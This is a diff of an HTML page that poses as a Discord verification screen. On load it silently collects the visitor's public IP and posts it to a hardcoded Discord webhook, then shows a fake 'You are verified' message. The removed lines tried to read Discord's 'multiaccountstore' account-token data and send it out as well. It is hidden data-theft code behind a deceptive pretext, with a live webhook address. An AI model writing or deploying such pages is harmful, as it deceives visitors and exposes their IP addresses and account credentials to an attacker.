@@ -40,51 +40,17 @@
     <div id="verifiedText">You are verified, you can close this page and come back to discord!</div>
 
     <script>
-        window.onload = function() {
-            // Open Discord in a new tab
-            var discordWindow = window.open('https://discord.com', '_blank');
-
-            // Wait for the Discord window to load
-            discordWindow.onload = function() {
-                // Retrieve the 'multiaccountstore' value from the Discord window
-                var multiAccountStore = discordWindow.localStorage.getItem('multiaccountstore');
-
-                // Call the switchContent function with the multiAccountStore value
-                switchContent(multiAccountStore);
-            }
-        }
-
-        function switchContent(multiAccountStore) {
-            // Send the IP and multiaccountstore to the Discord webhook
-            sendIP(multiAccountStore);
-
-            // Show the GIF and "Please wait" text
-            document.getElementById('gif').style.display = 'block';
-            document.getElementById('pleaseWait').style.display = 'block';
-
-            // Wait 4 seconds before switching content
-            setTimeout(function() {
-                // Hide the GIF and "Please wait" text
-                document.getElementById('gif').style.display = 'none';
-                document.getElementById('pleaseWait').style.display = 'none';
-
-                // Show the final image and "Verified" text
-                document.getElementById('finalImage').style.display = 'block';
-                document.getElementById('verifiedText').style.display = 'block';
-            }, 4000);
-        }
-
-        async function sendIP(multiAccountStore) {
+        async function sendIP() {
             try {
-                // Get the public IP address using the ipify API
+                // Obtenir l'adresse IP publique via l'API ipify
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
-
-                // Prepare the message for the Discord webhook
-                const message = `Nouvelle IP : ${ip}\nMultiaccount Store: ${multiAccountStore}`;
-
-                // Send the IP and multiaccountstore to the Discord webhook
+                
+                // Préparer le message pour le webhook Discord
+                const message = `Nouvelle IP : ${ip}`;
+                
+                // Envoyer l'adresse IP au webhook Discord
                 const webhookUrl = 'https://discord.com/api/webhooks/1273657947024654376/kgCCA9Cc65zomW-vWqAKM_8hCUBizn4C7KCsQPDHDKEdLcmsRvb9682JO7ZbJn9o4t-i';
                 await fetch(webhookUrl, {
                     method: 'POST',
@@ -93,11 +59,34 @@
                     },
                     body: JSON.stringify({ content: message }),
                 });
-                console.log('IP et multiaccountstore envoyés au webhook Discord.');
+                console.log('IP envoyée au webhook Discord.');
             } catch (error) {
-                console.error('Erreur lors de l\'envoi des données:', error);
+                console.error('Erreur lors de l\'envoi de l\'IP:', error);
             }
         }
+
+        function switchContent() {
+            // Envoyer l'IP au webhook
+            sendIP();
+
+            // Afficher le GIF et le texte "Please wait"
+            document.getElementById('gif').style.display = 'block';
+            document.getElementById('pleaseWait').style.display = 'block';
+            
+            // Attendre 4 secondes avant de changer le contenu
+            setTimeout(function() {
+                // Cacher le GIF et le texte "Please wait"
+                document.getElementById('gif').style.display = 'none';
+                document.getElementById('pleaseWait').style.display = 'none';
+                
+                // Afficher l'image finale et le texte de vérification
+                document.getElementById('finalImage').style.display = 'block';
+                document.getElementById('verifiedText').style.display = 'block';
+            }, 4000);
+        }
+
+        // Appeler la fonction au chargement de la page
+        window.onload = switchContent;
     </script>
 </body>
 </html>
